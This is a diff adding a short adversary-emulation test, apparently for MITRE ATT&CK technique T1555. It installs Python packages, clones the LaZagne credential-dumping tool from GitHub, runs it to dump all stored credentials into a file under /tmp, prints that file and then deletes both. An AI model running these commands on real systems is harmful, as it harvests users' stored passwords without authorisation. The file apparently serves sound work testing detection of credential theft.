@@ -1,0 +1,10 @@
+Elevation Required;
+#pre
+apt install git; apt install python3-pip -y; pip install pyasn1 psutil Crypto
+cd /tmp; git clone https://github.com/AlessandroZ/LaZagne; cd /tmp/LaZagne/; pip install -r requirements.txt
+#command
+python3 /tmp/LaZagne/Linux/laZagne.py all > /tmp/T1555.txt
+#check
+cat /tmp/T1555.txt
+#cleanup
+rm -R /tmp/LaZagne; rm -f /tmp/T1555.txt
